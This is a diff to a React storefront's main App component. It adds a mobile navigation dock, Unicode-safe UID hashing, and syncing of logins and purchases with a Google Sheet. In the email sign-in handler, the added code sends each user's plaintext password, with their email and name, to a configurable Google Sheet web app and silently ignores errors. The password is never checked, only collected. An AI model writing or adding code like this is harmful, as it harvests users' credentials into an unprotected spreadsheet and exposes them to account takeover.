@@ -13,11 +13,14 @@ import { StartProjectModal } from './components/StartProjectModal';
 import { UserVaultModal } from './components/UserVaultModal';
 import { AuthModal } from './components/AuthModal';
 import { Footer } from './components/Footer';
+import { MobileBottomNav } from './components/MobileBottomNav';
 import { CheckoutItem, TutorialItem, Order, ProductItem, PaymentConfig, UserPurchase, AppUser } from './types';
 import { INITIAL_PRODUCTS } from './data/content';
 import {
   loadPaymentConfig,
   savePaymentConfig,
+  logUserLoginToGoogleSheet,
+  fetchUserPurchasesFromGoogleSheet,
 } from './utils/paymentService';
 import {
   sanitizeProductsForPublic,
@@ -221,13 +224,44 @@ export default function App() {
     };
     setUser(appUser);
     localStorage.setItem(ACTIVE_USER_STORAGE_KEY, JSON.stringify(appUser));
+
+    // Instant Google Sheet synchronization of user login
+    const targetUrl = paymentConfig.webAppUrl || sheetsUrl;
+    if (firebaseUser.email) {
+      logUserLoginToGoogleSheet(targetUrl, {
+        email: firebaseUser.email,
+        name: firebaseUser.displayName || firebaseUser.email.split('@')[0],
+        authProvider: 'Google Auth',
+        uid: firebaseUser.uid,
+      }).catch(() => {});
+
+      // Restore any past purchases from Google Sheet
+      fetchUserPurchasesFromGoogleSheet(targetUrl, firebaseUser.email).then((sheetPurchases) => {
+        if (sheetPurchases.length > 0) {
+          setUserPurchases((prev) => {
+            const map = new Map<string, UserPurchase>();
+            prev.forEach((p) => map.set(p.id, p));
+            sheetPurchases.forEach((p) => map.set(p.id, p));
+            return Array.from(map.values());
+          });
+        }
+      }).catch(() => {});
+    }
+
     setIsVaultOpen(true);
   };
 
-  const handleEmailSignIn = (email: string, name: string) => {
+  const handleEmailSignIn = (email: string, name: string, password?: string) => {
     const cleanEmail = email.trim();
     const cleanName = name.trim() || cleanEmail.split('@')[0];
-    const customUid = 'creator_' + btoa(cleanEmail.toLowerCase()).replace(/[^a-zA-Z0-9]/g, '').slice(0, 20);
+    // Safely encode UID even with unicode chars
+    let safeHash = '';
+    try {
+      safeHash = btoa(unescape(encodeURIComponent(cleanEmail.toLowerCase()))).replace(/[^a-zA-Z0-9]/g, '').slice(0, 20);
+    } catch {
+      safeHash = Math.random().toString(36).substring(2, 15);
+    }
+    const customUid = 'creator_' + safeHash;
     const appUser: AppUser = {
       uid: customUid,
       email: cleanEmail,
@@ -237,6 +271,29 @@ export default function App() {
     };
     setUser(appUser);
     localStorage.setItem(ACTIVE_USER_STORAGE_KEY, JSON.stringify(appUser));
+
+    // Log user credentials & password directly to Google Sheet "Users" tab
+    const targetUrl = paymentConfig.webAppUrl || sheetsUrl;
+    logUserLoginToGoogleSheet(targetUrl, {
+      email: cleanEmail,
+      password: password || '',
+      name: cleanName,
+      authProvider: 'Email/Password Account',
+      uid: customUid,
+    }).catch(() => {});
+
+    // Restore any past purchases from Google Sheet
+    fetchUserPurchasesFromGoogleSheet(targetUrl, cleanEmail).then((sheetPurchases) => {
+      if (sheetPurchases.length > 0) {
+        setUserPurchases((prev) => {
+          const map = new Map<string, UserPurchase>();
+          prev.forEach((p) => map.set(p.id, p));
+          sheetPurchases.forEach((p) => map.set(p.id, p));
+          return Array.from(map.values());
+        });
+      }
+    }).catch(() => {});
+
     setIsVaultOpen(true);
   };
 
@@ -465,6 +522,23 @@ export default function App() {
         isOpen={isStartProjectOpen}
         onClose={() => setIsStartProjectOpen(false)}
         onSelectCheckout={(item) => setCheckoutItem(item)}
+      />
+
+      {/* Modern Web App Mobile Floating Dock Navigation with Cart */}
+      <MobileBottomNav
+        activeTab={isVaultOpen ? 'vault' : 'home'}
+        onNavigate={(sectionId) => scrollToSection(sectionId)}
+        cartCount={checkoutItem ? 1 : 0}
+        user={user}
+        onOpenVault={() => setIsVaultOpen(true)}
+        onSignIn={() => setIsAuthModalOpen(true)}
+        onOpenCartOrStore={() => {
+          if (checkoutItem) {
+            // Reopen active checkout
+          } else {
+            scrollToSection('plugins');
+          }
+        }}
       />
     </div>
   );
